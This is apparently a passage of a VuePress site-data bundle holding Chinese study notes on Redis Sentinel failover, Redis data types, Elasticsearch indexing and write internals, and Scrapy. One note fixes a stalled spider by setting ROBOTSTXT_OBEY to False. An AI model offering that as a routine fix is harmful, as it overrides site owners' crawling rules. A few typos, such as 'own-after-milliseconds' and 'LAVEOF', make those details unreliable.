下线\n\n主观下线：如果一个实例(instance)距离最后—次有效回复PING命令的时间超过own-after-milliseconds选项所指定的值，则这个实例会被Sentinel标记为主观下线。\n\n客观下线：当有足够数量的Sentinel(大于等于配置文件指定的值)在指定的时间范围内确认Master的确进入了主观下线状态，贝则Master会被标记为客观下线。\n\n\n# master节点挂掉，主从切换\n\n\n\n\n# 选取条件\n\nsentinel从slave选出新的master条件:\n\n 1. 剔除主观下线、已断线、或者最后—次回复PING命令的时间大于五秒钟的Slave\n 2. 剔除与失效主服务器连接断开的时长超过down-after 选项指定的时长十倍的Slave\n 3. 按同步数据的偏移量选出数据最完整的Slave\n 4. 如果偏移量相同，选中ID最小的Slave\n\n\n# 切换过程\n\n\n\n 1. 选中的从服务器发送LAVEOF NO ONE令，让它转变为主服务器。\n 2. 发布与订阅功能，将更新后的配置传播给所有其他Sentinel ，其他Sentinel 对它们自己的配置进行更新。\n 3. 向所有Slave下达SLAVEOF令，指向新的主\n 4. redis-slave向master重新建立连接，重放rdb保持数据同步\n 5. 在上述转移过程中，伴随着Redis本地配置文件的自动重写，这样即便是实例重启配置也不会丢失\n 6. 原有的master在恢复后降级为slave与新master全量同步\n\n\n# redis sentinel节点高可用\n\nsentinel之间是怎么感知的，怎么知道其他sentinel？ sentinel和redis-master之间会存储数据\n\n 1. sentinel自动故障迁移使用raft算法 Raft选举算法 来选举领头(leader)sentinel\n 2. 超过半数投票选出leader, sentinel Leader用于下达故障转移的指令\n 3. 如果某个Leader挂了，则使用Raft从剩余的Sentinel中选出leader\n\n> 参考：\n> \n>  1. https://www.bilibili.com/video/BV1jM4y1V79K",normalizedContent:"redis主从数据同步过程 ： redis 主从架构原理\n\nsentinel英文的意思是哨兵，主要是用于检测主从架构的运行情况，如果master服务挂掉了会重新选取一个slave变成master\n\nsentinel分为leader和普通的sentinel\n\n\n# redis node节点高可用\n\n每个sentinel以每秒钟—次的频率向它所知的master，slave以及其他 sentinel 实例发送一个ping命令。\n\n\n# 下线\n\n主观下线：如果一个实例(instance)距离最后—次有效回复ping命令的时间超过own-after-milliseconds选项所指定的值，则这个实例会被sentinel标记为主观下线。\n\n客观下线：当有足够数量的sentinel(大于等于配置文件指定的值)在指定的时间范围内确认master的确进入了主观下线状态，贝则master会被标记为客观下线。\n\n\n# master节点挂掉，主从切换\n\n\n\n\n# 选取条件\n\nsentinel从slave选出新的master条件:\n\n 1. 剔除主观下线、已断线、或者最后—次回复ping命令的时间大于五秒钟的slave\n 2. 剔除与失效主服务器连接断开的时长超过down-after 选项指定的时长十倍的slave\n 3. 按同步数据的偏移量选出数据最完整的slave\n 4. 如果偏移量相同，选中id最小的slave\n\n\n# 切换过程\n\n\n\n 1. 选中的从服务器发送laveof no one令，让它转变为主服务器。\n 2. 发布与订阅功能，将更新后的配置传播给所有其他sentinel ，其他sentinel 对它们自己的配置进行更新。\n 3. 向所有slave下达slaveof令，指向新的主\n 4. redis-slave向master重新建立连接，重放rdb保持数据同步\n 5. 在上述转移过程中，伴随着redis本地配置文件的自动重写，这样即便是实例重启配置也不会丢失\n 6. 原有的master在恢复后降级为slave与新master全量同步\n\n\n# redis sentinel节点高可用\n\nsentinel之间是怎么感知的，怎么知道其他sentinel？ sentinel和redis-master之间会存储数据\n\n 1. sentinel自动故障迁移使用raft算法 raft选举算法 来选举领头(leader)sentinel\n 2. 超过半数投票选出leader, sentinel leader用于下达故障转移的指令\n 3. 如果某个leader挂了，则使用raft从剩余的sentinel中选出leader\n\n> 参考：\n> \n>  1. https://www.bilibili.com/video/bv1jm4y1v79k",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"redis 高性能的原因",frontmatter:{title:"redis 高性能的原因",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/e8d59c/",categories:["软件使用","redis"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/07.redis/08.redis%20%E9%AB%98%E6%80%A7%E8%83%BD%E7%9A%84%E5%8E%9F%E5%9B%A0.html",relativePath:"08.软件使用/07.redis/08.redis 高性能的原因.md",key:"v-448f76d0",path:"/pages/e8d59c/",headersStr:null,content:" 1. 数据在内存中操作\n 2. 单线程避免了上下文切换\n 3. 非阻塞的IO多路复用",normalizedContent:" 1. 数据在内存中操作\n 2. 单线程避免了上下文切换\n 3. 非阻塞的io多路复用",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"redis 内存淘汰机制",frontmatter:{title:"redis 内存淘汰机制",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/fcacdb/",categories:["软件使用","redis"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/07.redis/09.redis%20%E5%86%85%E5%AD%98%E6%B7%98%E6%B1%B0%E6%9C%BA%E5%88%B6.html",relativePath:"08.软件使用/07.redis/09.redis 内存淘汰机制.md",key:"v-446059e1",path:"/pages/fcacdb/",headersStr:null,content:"redis存进去的数据，如果内存满了，即使没过期，依然会有数据被替换掉",normalizedContent:"redis存进去的数据，如果内存满了，即使没过期，依然会有数据被替换掉",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"Redis 数据类型与相关命令",frontmatter:{title:"Redis 数据类型与相关命令",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/9ad74b/",categories:["软件使用","redis"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/07.redis/10.Redis%20%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E4%B8%8E%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4.html",relativePath:"08.软件使用/07.redis/10.Redis 数据类型与相关命令.md",key:"v-7d7415ee",path:"/pages/9ad74b/",headersStr:null,content:"# 1. key (键)\n\n\n\n\nRedis有五大数据类型：String、List、Set、Zset、Hash\n\n注意：Redis采用键值对存储数据，key永远是String类型，五大数据类型指的是value部分\n\n\n\n# 2. String (字符串)\n\n一个key对应一个value；String可以包含任何数据，比如jpg图片等；String是Redis最基本的 数据类型，一个String的value最大可支持512M\n\n\n\n\n\n# 3. List (列表)\n\n底层是一个字符串链表；可以从头或尾添加元素\n\n注意：\n\n(1) 添加元素时：\n\n如果key不存在，创建新的链表\n如果key已存在，添加内容\n如果key的所有值全部删除，则对应的key也会随之消失\n\n(2) 在链表的头尾操作时效率较高，但是对中间元素的操作效率较低\n\n\n\n\n\n# 4. Set (集合)\n\n底层通过HashTable实现；是String类型的无重复值的无序集合\n\n\n\n\n\n# 5. Zset (有序集合)\n\n类似Set；每个元素都会关联一个double类型的分数(score)；Redis通过分数自动的为集合中的 成员进行从小到大的排序；成员不可重复，分数可以重复\n\n\n\n\n# 6. Hash (哈希)\n\n类似Java中的Map<String, Object>；是一个键值对集合；适合存储对象\n\n",normalizedContent:"# 1. key (键)\n\n\n\n\nredis有五大数据类型：string、list、set、zset、hash\n\n注意：redis采用键值对存储数据，key永远是string类型，五大数据类型指的是value部分\n\n\n\n# 2. string (字符串)\n\n一个key对应一个value；string可以包含任何数据，比如jpg图片等；string是redis最基本的 数据类型，一个string的value最大可支持512m\n\n\n\n\n\n# 3. list (列表)\n\n底层是一个字符串链表；可以从头或尾添加元素\n\n注意：\n\n(1) 添加元素时：\n\n如果key不存在，创建新的链表\n如果key已存在，添加内容\n如果key的所有值全部删除，则对应的key也会随之消失\n\n(2) 在链表的头尾操作时效率较高，但是对中间元素的操作效率较低\n\n\n\n\n\n# 4. set (集合)\n\n底层通过hashtable实现；是string类型的无重复值的无序集合\n\n\n\n\n\n# 5. zset (有序集合)\n\n类似set；每个元素都会关联一个double类型的分数(score)；redis通过分数自动的为集合中的 成员进行从小到大的排序；成员不可重复，分数可以重复\n\n\n\n\n# 6. hash (哈希)\n\n类似java中的map<string, object>；是一个键值对集合；适合存储对象\n\n",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"redis 运行机制",frontmatter:{title:"redis 运行机制",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/0d430b/",categories:["软件使用","redis"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/07.redis/11.redis%20%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6.html",relativePath:"08.软件使用/07.redis/11.redis 运行机制.md",key:"v-d70e2eb0",path:"/pages/0d430b/",headersStr:null,content:"客户端接收redis的请求 将请求交给io多路复用程序 io多路服用程序将请求放置到队列中 redis单线程的去执行操作：文件事件分派器从队列取时间交给对应的事件处理器",normalizedContent:"客户端接收redis的请求 将请求交给io多路复用程序 io多路服用程序将请求放置到队列中 redis单线程的去执行操作：文件事件分派器从队列取时间交给对应的事件处理器",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"redis 主从架构原理",frontmatter:{title:"redis 主从架构原理",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/f6b0d1/",categories:["软件使用","redis"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/07.redis/12.redis%20%E4%B8%BB%E4%BB%8E%E6%9E%B6%E6%9E%84%E5%8E%9F%E7%90%86.html",relativePath:"08.软件使用/07.redis/12.redis 主从架构原理.md",key:"v-7aa08028",path:"/pages/f6b0d1/",headersStr:null,content:"",normalizedContent:"",charsets:{},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"Redis使用“：”对key进行分类存储",frontmatter:{title:"Redis使用“：”对key进行分类存储",date:"2022-08-10T15:50:10.000Z",permalink:"/pages/688701/",categories:["软件使用","redis"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/07.redis/13.Redis%E4%BD%BF%E7%94%A8%E2%80%9C%EF%BC%9A%E2%80%9D%E5%AF%B9key%E8%BF%9B%E8%A1%8C%E5%88%86%E7%B1%BB%E5%AD%98%E5%82%A8.html",relativePath:"08.软件使用/07.redis/13.Redis使用“：”对key进行分类存储.md",key:"v-517cdd78",path:"/pages/688701/",headersStr:null,content:"通常存在redis中的key值是这个样子的，只看key值，我们很难知道这个key值是干什么的，有什么用处。\n\n\n\n所以需要我们对key值进行一定的分类：\n\n使用“：”冒号来体现层次。\n\n例如：set intern:user:user_code 123456  得到形式如下：\n\n",normalizedContent:"通常存在redis中的key值是这个样子的，只看key值，我们很难知道这个key值是干什么的，有什么用处。\n\n\n\n所以需要我们对key值进行一定的分类：\n\n使用“：”冒号来体现层次。\n\n例如：set intern:user:user_code 123456  得到形式如下：\n\n",charsets:{cjk:!0},lastUpdated:"2022/05/31, 15:16:14",lastUpdatedTimestamp:1653981374e3},{title:"scrapy parse不访问的解决办法",frontmatter:{title:"scrapy parse不访问的解决办法",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/c7abe7/",categories:["软件使用","scrapy"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/08.scrapy/01.scrapy%20parse%E4%B8%8D%E8%AE%BF%E9%97%AE%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95.html",relativePath:"08.软件使用/08.scrapy/01.scrapy parse不访问的解决办法.md",key:"v-5f38a946",path:"/pages/c7abe7/",headersStr:null,content:"我之前发现我的爬虫里面的parse函数一直不会被执行到\n\n然后换了一个网页又可以执行到了 我猜测是robot.txt的问题\n\n经过查询文档发现 settings.py里面有一条修改一下就可以解决这个问题\n\n将ROBOTSTXT_OBEY = True改成ROBOTSTXT_OBEY = False",normalizedContent:"我之前发现我的爬虫里面的parse函数一直不会被执行到\n\n然后换了一个网页又可以执行到了 我猜测是robot.txt的问题\n\n经过查询文档发现 settings.py里面有一条修改一下就可以解决这个问题\n\n将robotstxt_obey = true改成robotstxt_obey = false",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"相关概念",frontmatter:{title:"相关概念",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/0f7709/",categories:["软件使用","elastic search"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/09.elastic%20search/01.%E7%9B%B8%E5%85%B3%E6%A6%82%E5%BF%B5.html",relativePath:"08.软件使用/09.elastic search/01.相关概念.md",key:"v-32dde708",path:"/pages/0f7709/",headersStr:null,content:"Near Realtime（近实时）：Elasticsearch是一个近乎实时的搜索平台，这意味着从索引文档到可搜索文档之间只有一个轻微的延迟(通常是一秒钟)。\n\nCluster（集群）：群集是一个或多个节点的集合，它们一起保存整个数据，并提供跨所有节点的联合索引和搜索功能。每个群集都有自己的唯一群集名称，节点通过名称加入群集。\n\nNode（节点）：节点是指属于集群的单个Elasticsearch实例，存储数据并参与集群的索引和搜索功能。可以将节点配置为按集群名称加入特定集群，默认情况下，每个节点都设置为加入一个名为elasticsearch的群集。\n\nIndex（索引）：索引是一些具有相似特征的文档集合，类似于MySql中数据库的概念。\n\nType（类型）：类型是索引的逻辑类别分区，通常，为具有一组公共字段的文档类型，类似MySql中表的概念。注意：在Elasticsearch 6.0.0及更高的版本中，一个索引只能包含一个类型。\n\nDocument（文档）：文档是可被索引的基本信息单位，以JSON形式表示，类似于MySql中行记录的概念。\n\nShards（分片）：当索引存储大量数据时，可能会超出单个节点的硬件限制，为了解决这个问题，Elasticsearch提供了将索引细分为分片的概念。分片机制赋予了索引水平扩容的能力、并允许跨分片分发和并行化操作，从而提高性能和吞吐量。\n\nReplicas（副本）：在可能出现故障的网络环境中，需要有一个故障切换机制，Elasticsearch提供了将索引的分片复制为一个或多个副本的功能，副本在某些节点失效的情况下提供高可用性。",normalizedContent:"near realtime（近实时）：elasticsearch是一个近乎实时的搜索平台，这意味着从索引文档到可搜索文档之间只有一个轻微的延迟(通常是一秒钟)。\n\ncluster（集群）：群集是一个或多个节点的集合，它们一起保存整个数据，并提供跨所有节点的联合索引和搜索功能。每个群集都有自己的唯一群集名称，节点通过名称加入群集。\n\nnode（节点）：节点是指属于集群的单个elasticsearch实例，存储数据并参与集群的索引和搜索功能。可以将节点配置为按集群名称加入特定集群，默认情况下，每个节点都设置为加入一个名为elasticsearch的群集。\n\nindex（索引）：索引是一些具有相似特征的文档集合，类似于mysql中数据库的概念。\n\ntype（类型）：类型是索引的逻辑类别分区，通常，为具有一组公共字段的文档类型，类似mysql中表的概念。注意：在elasticsearch 6.0.0及更高的版本中，一个索引只能包含一个类型。\n\ndocument（文档）：文档是可被索引的基本信息单位，以json形式表示，类似于mysql中行记录的概念。\n\nshards（分片）：当索引存储大量数据时，可能会超出单个节点的硬件限制，为了解决这个问题，elasticsearch提供了将索引细分为分片的概念。分片机制赋予了索引水平扩容的能力、并允许跨分片分发和并行化操作，从而提高性能和吞吐量。\n\nreplicas（副本）：在可能出现故障的网络环境中，需要有一个故障切换机制，elasticsearch提供了将索引的分片复制为一个或多个副本的功能，副本在某些节点失效的情况下提供高可用性。",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"什么是倒排索引？",frontmatter:{title:"什么是倒排索引？",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/215c5e/",categories:["软件使用","elastic search"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/09.elastic%20search/02.%E4%BB%80%E4%B9%88%E6%98%AF%E5%80%92%E6%8E%92%E7%B4%A2%E5%BC%95%EF%BC%9F.html",relativePath:"08.软件使用/09.elastic search/02.什么是倒排索引？.md",key:"v-40d7928c",path:"/pages/215c5e/",headersStr:null,content:"# 1. 正向索引\n\n在搜索引擎中每个文件都对应一个文件ID，文件内容被表示为一系列关键词的集合（实际上在搜索引擎索引库中，关键词也已经转换为关键词ID）。例如“文档1”经过分词，提取了20个关键词，每个关键词都会记录它在文档中的出现次数和出现位置。\n\n得到正向索引的结构如下：\n\n“文档1”的ID > 单词1：出现次数，出现位置列表；单词2：出现次数，出现位置列表；…………。\n\n“文档2”的ID > 此文档出现的关键词列表。\n\n\n\n通过key，去找value。\n\n\n# 2. 倒排索引\n\n当用户在主页上搜索关键词“华为手机”时，假设只存在正向索引（forward index），那么就需要扫描索引库中的所有文档，找出所有包含关键词“华为手机”的文档，再根据打分模型进行打分，排出名次后呈现给用户。因为互联网上收录在搜索引擎中的文档的数目是个天文数字，这样的索引结构根本无法满足实时返回排名结果的要求。\n\n所以，搜索引擎会将正向索引重新构建为倒排索引，即把文件ID对应到关键词的映射转换为关键词到文件ID的映射，每个关键词都对应着一系列的文件，这些文件中都出现这个关键词。\n\n得到倒排索引的结构如下：\n\n“关键词1”：“文档1”的ID，“文档2”的ID，…………。\n\n“关键词2”：带有此关键词的文档ID列表。\n\n从词的关键字，去找文档。\n\n\n# 3. 倒排索引简单实例\n\n假设文档集合包含五个文档，每个文档内容如图所示 中文和英文等语言不同，单词之间没有明确分隔符号，所以首先要用分词系统将文档自动切分成单词序列。这样每个文档就转换为由单词序列构成的数据流，为了系统后续处理方便，需要对每个不同的单词赋予唯一的单词编号，同时记录下哪些文档包含这个单词，在如此处理结束后，我们可以得到最简单的倒排索引。\n\n在图中，“单词ID”一栏记录了每个单词的单词编号，第二栏是对应的单词，第三栏即每个单词对应的倒排列表。 比如单词“谷歌”，其单词编号为1，倒排列表为{1,2,3,4,5}，说明文档集合中每个文档都包含了这个单词。\n\n还可以加上频率：比如单词“创始人”的单词编号为7，对应的倒排列表内容为：（3:1），其中的3代表文档编号为3的文档包含这个单词，数字1代表词频信息，即这个单词在3号文档中只出现过1次，其它单词对应的倒排列表所代表含义与此相同。",normalizedContent:"# 1. 正向索引\n\n在搜索引擎中每个文件都对应一个文件id，文件内容被表示为一系列关键词的集合（实际上在搜索引擎索引库中，关键词也已经转换为关键词id）。例如“文档1”经过分词，提取了20个关键词，每个关键词都会记录它在文档中的出现次数和出现位置。\n\n得到正向索引的结构如下：\n\n“文档1”的id > 单词1：出现次数，出现位置列表；单词2：出现次数，出现位置列表；…………。\n\n“文档2”的id > 此文档出现的关键词列表。\n\n\n\n通过key，去找value。\n\n\n# 2. 倒排索引\n\n当用户在主页上搜索关键词“华为手机”时，假设只存在正向索引（forward index），那么就需要扫描索引库中的所有文档，找出所有包含关键词“华为手机”的文档，再根据打分模型进行打分，排出名次后呈现给用户。因为互联网上收录在搜索引擎中的文档的数目是个天文数字，这样的索引结构根本无法满足实时返回排名结果的要求。\n\n所以，搜索引擎会将正向索引重新构建为倒排索引，即把文件id对应到关键词的映射转换为关键词到文件id的映射，每个关键词都对应着一系列的文件，这些文件中都出现这个关键词。\n\n得到倒排索引的结构如下：\n\n“关键词1”：“文档1”的id，“文档2”的id，…………。\n\n“关键词2”：带有此关键词的文档id列表。\n\n从词的关键字，去找文档。\n\n\n# 3. 倒排索引简单实例\n\n假设文档集合包含五个文档，每个文档内容如图所示 中文和英文等语言不同，单词之间没有明确分隔符号，所以首先要用分词系统将文档自动切分成单词序列。这样每个文档就转换为由单词序列构成的数据流，为了系统后续处理方便，需要对每个不同的单词赋予唯一的单词编号，同时记录下哪些文档包含这个单词，在如此处理结束后，我们可以得到最简单的倒排索引。\n\n在图中，“单词id”一栏记录了每个单词的单词编号，第二栏是对应的单词，第三栏即每个单词对应的倒排列表。 比如单词“谷歌”，其单词编号为1，倒排列表为{1,2,3,4,5}，说明文档集合中每个文档都包含了这个单词。\n\n还可以加上频率：比如单词“创始人”的单词编号为7，对应的倒排列表内容为：（3:1），其中的3代表文档编号为3的文档包含这个单词，数字1代表词频信息，即这个单词在3号文档中只出现过1次，其它单词对应的倒排列表所代表含义与此相同。",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"es搜索过程",frontmatter:{title:"es搜索过程",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/b3df3a/",categories:["软件使用","elastic search"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/09.elastic%20search/04.es%E6%90%9C%E7%B4%A2%E8%BF%87%E7%A8%8B.html",relativePath:"08.软件使用/09.elastic search/04.es搜索过程.md",key:"v-69b265ce",path:"/pages/b3df3a/",headersStr:null,content:"ES读数据原理\n\n 1. 客户端发送搜索的关键字到es的任意节点（协调节点）\n 2. 协调节点将这些数据发送给每一个shard(同一个shard的primary shard和replica record里只选择一个)\n 3. 然后对每个shard的搜索结果汇合（结果就是一些doc id）\n 4. 将回合的结果合并排序分页整理产生最终结果\n 5. 将结果返回给客户端",normalizedContent:"es读数据原理\n\n 1. 客户端发送搜索的关键字到es的任意节点（协调节点）\n 2. 协调节点将这些数据发送给每一个shard(同一个shard的primary shard和replica record里只选择一个)\n 3. 然后对每个shard的搜索结果汇合（结果就是一些doc id）\n 4. 将回合的结果合并排序分页整理产生最终结果\n 5. 将结果返回给客户端",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"ES读数据原理",frontmatter:{title:"ES读数据原理",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/845846/",categories:["软件使用","elastic search"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/09.elastic%20search/03.ES%E8%AF%BB%E6%95%B0%E6%8D%AE%E5%8E%9F%E7%90%86.html",relativePath:"08.软件使用/09.elastic search/03.ES读数据原理.md",key:"v-2f51777e",path:"/pages/845846/",headersStr:null,content:"# 1. 什么是ES读数据\n\n读数据和搜索的概念不一样，它不是搜索，意思是根据id来查文档（文档被写入es的时候会被分配一个doc id，也可以自己指定）\n\n\n# 2. 过程\n\n 1. 随便访问一个节点（此时它被称为协调节点）\n 2. 协调节点会根据id hash到对应的shard(多个shard会负载均衡，包括primary shard和replica shard),然后根据找shard要数据，再将数据返回给客户端",normalizedContent:"# 1. 什么是es读数据\n\n读数据和搜索的概念不一样，它不是搜索，意思是根据id来查文档（文档被写入es的时候会被分配一个doc id，也可以自己指定）\n\n\n# 2. 过程\n\n 1. 随便访问一个节点（此时它被称为协调节点）\n 2. 协调节点会根据id hash到对应的shard(多个shard会负载均衡，包括primary shard和replica shard),然后根据找shard要数据，再将数据返回给客户端",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"ES写数据的原理",frontmatter:{title:"ES写数据的原理",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/10a4eb/",categories:["软件使用","elastic search"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/09.elastic%20search/05.ES%E5%86%99%E6%95%B0%E6%8D%AE%E7%9A%84%E5%8E%9F%E7%90%86.html",relativePath:"08.软件使用/09.elastic search/05.ES写数据的原理.md",key:"v-df927976",path:"/pages/10a4eb/",headersStr:null,content:"# 1. 过程\n\n 1. 发送请求：客户端随便择一个node发送请求过去，这个被发送请求的Node是协调节点\n\n 2. 路由：协调节点对document进行（hash）选择shard，将请求转发给对应的node（有primary shard）\n\n 3. 处理与同步：实际的node上的primary shard处理请求，然后将数据同步到replica node\n\n 4. 返回成功信息：coordinating node，如果发现primary node和所有replica node都搞定之后，就返回响应结果给客户端\n\n\n# 底层原理\n\n1）先写入buffer，在buffer里的时候数据是搜索不到的；同时将数据写入translog日志文件\n\n2）如果buffer快满了，或者到一定时间，就会将buffer数据refresh到一个新的segment file中，但是此时数据不是直接进入segment file的磁盘文件的，而是先进入os cache的。这个过程就是refresh。\n\n每隔1秒钟，es将buffer中的数据写入一个新的segment file，每秒钟会产生一个新的磁盘文件，segment file，这个segment file中就存储最近1秒内buffer中写入的数据\n\n但是如果buffer里面此时没有数据，那当然不会执行refresh操作咯，每秒创建换一个空的segment file，如果buffer里面有数据，默认1秒钟执行一次refresh操作，刷入一个新的segment file中\n\n操作系统里面，磁盘文件其实都有一个东西，叫做os cache，操作系统缓存，就是说数据写入磁盘文件之前，会先进入os cache，先进入操作系统级别的一个内存缓存中去\n\n只要buffer中的数据被refresh操作，刷入os cache中，就代表这个数据就可以被搜索到了\n\n为什么叫es是准实时的？NRT，near real-time，准实时。默认是每隔1秒refresh一次的，所以es是准实时的，因为写入的数据1秒之后才能被看到。\n\n可以通过es的restful api或者java api，手动执行一次refresh操作，就是手动将buffer中的数据刷入os cache中，让数据立马就可以被搜索到。\n\n只要数据被输入os cache中，buffer就会被清空了，因为不需要保留buffer了，数据在translog里面已经持久化到磁盘去一份\n\n3）只要数据进入os cache，此时就可以让这个segment file的数据对外提供搜索了\n\n4）重复1~3步骤，新的数据不断进入buffer和translog，不断将buffer数据写入一个又一个新的segment file中去，每次refresh完buffer清空，translog保留。随着这个过程推进，translog会变得越来越大。当translog达到一定长度的时候，就会触发commit操作。\n\nbuffer中的数据，倒是好，每隔1秒就被刷到os cache中去，然后这个buffer就被清空了。所以说这个buffer的数据始终是可以保持住不会填满es进程的内存的。\n\n每次一条数据写入buffer，同时会写入一条日志到translog日志文件中去，所以这个translog日志文件是不断变大的，当translog日志文件大到一定程度的时候，就会执行commit操作。\n\n5）commit操作发生第一步，就是将buffer中现有数据refresh到os cache中去，清空buffer\n\n6）将一个commit point写入磁盘文件，里面标识着这个commit point对应的所有segment file\n\n7）强行将os cache中目前所有的数据都fsync到磁盘文件中去\n\ntranslog日志文件的作用是什么？就是在你执行commit操作之前，数据要么是停留在buffer中，要么是停留在os cache中，无论是buffer还是os cache都是内存，一旦这台机器死了，内存中的数据就全丢了。\n\n所以需要将数据对应的操作写入一个专门的日志文件，translog日志文件中，一旦此时机器宕机，再次重启的时候，es会自动读取translog日志文件中的数据，恢复到内存buffer和os cache中去。\n\ncommit操作：1、写commit point；2、将os cache数据fsync强刷到磁盘上去；3、清空translog日志文件\n\n8）将现有的translog清空，然后再次重启启用一个translog，此时commit操作完成。默认每隔30分钟会自动执行一次commit，但是如果translog过大，也会触发commit。整个commit的过程，叫做flush操作。我们可以手动执行flush操作就是将所有os cache数据刷到磁盘文件中去。\n\n不叫做commit操作，flush操作。es中的flush操作，就对应着commit的全过程。我们也可以通过es api，手动执行flush操作，手动将os cache中的数据fsync强刷到磁盘上去，记录一个commit point，清空translog日志文件。\n\n9）translog其实也是先写入os cache的，默认每隔5秒刷一次到磁盘中去，所以默认情况下，可能有5秒的数据会仅仅停留在buffer或者translog文件的os cache中，如果此时机器挂了，会丢失5秒钟的数据。但是这样性能比较好，最多丢5秒的数据。也可以将translog设置成每次写操作必须是直接fsync到磁盘，但是性能会差很多。\n\n实际上你在这里，如果面试官没有问你es丢数据的问题，你可以在这里给面试官炫一把，你说，其实es第一是准实时的，数据写入1秒后可以搜索到；可能会丢失数据的，你的数据有5秒的数据，停留在buffer、translog os cache、segment file os cache中，有5秒的数据不在磁盘上，此时如果宕机，会导致5秒的数据丢失。\n\n如果你希望一定不能丢失数据的话，你可以设置个参数，官方文档，百度一下。每次写入一条数据，都是写入buffer，同时写入磁盘上的translog，但是这会导致写性能、写入吞吐量会下降一个数量级。本来一秒钟可以写2000条，现在你一秒钟只能写200条，都有可能。\n\n10）如果是删除操作，commit的时候会生成一个.del文件，里面将某个doc标识为deleted状态，那么搜索的时候根据.del文件就知道这个doc被删除了\n\n11）如果是更新操作，就是将原来的doc标识为deleted状态，然后新写入一条数据\n\n12）buffer每次refresh一次，就会产生一个segment file，所以默认情况下是1秒钟一个segment file，segment file会越来越多，此时会定期执行merge\n\n13）每次merge的时候，会将多个segment file合并成一个，同时这里会将标识为deleted的doc给物理删除掉，然后将新的segment file写入磁盘，这里会写一个commit point，标识所有新的segment file，然后打开segment file供搜索使用，同时删除旧的segment file。\n\nes里的写流程，有4个底层的核心概念，refresh、flush、translog、merge\n\n当segment file多到一定程度的时候，es就会自动触发merge操作，将多个segment file给merge成一个segment file。",normalizedContent:"# 1. 过程\n\n 1. 发送请求：客户端随便择一个node发送请求过去，这个被发送请求的node是协调节点\n\n 2. 路由：协调节点对document进行（hash）选择shard，将请求转发给对应的node（有primary shard）\n\n 3. 处理与同步：实际的node上的primary shard处理请求，然后将数据同步到replica node\n\n 4. 返回成功信息：coordinating node，如果发现primary node和所有replica node都搞定之后，就返回响应结果给客户端\n\n\n# 底层原理\n\n1）先写入buffer，在buffer里的时候数据是搜索不到的；同时将数据写入translog日志文件\n\n2）如果buffer快满了，或者到一定时间，就会将buffer数据refresh到一个新的segment file中，但是此时数据不是直接进入segment file的磁盘文件的，而是先进入os cache的。这个过程就是refresh。\n\n每隔1秒钟，es将buffer中的数据写入一个新的segment file，每秒钟会产生一个新的磁盘文件，segment file，这个segment file中就存储最近1秒内buffer中写入的数据\n\n但是如果buffer里面此时没有数据，那当然不会执行refresh操作咯，每秒创建换一个空的segment 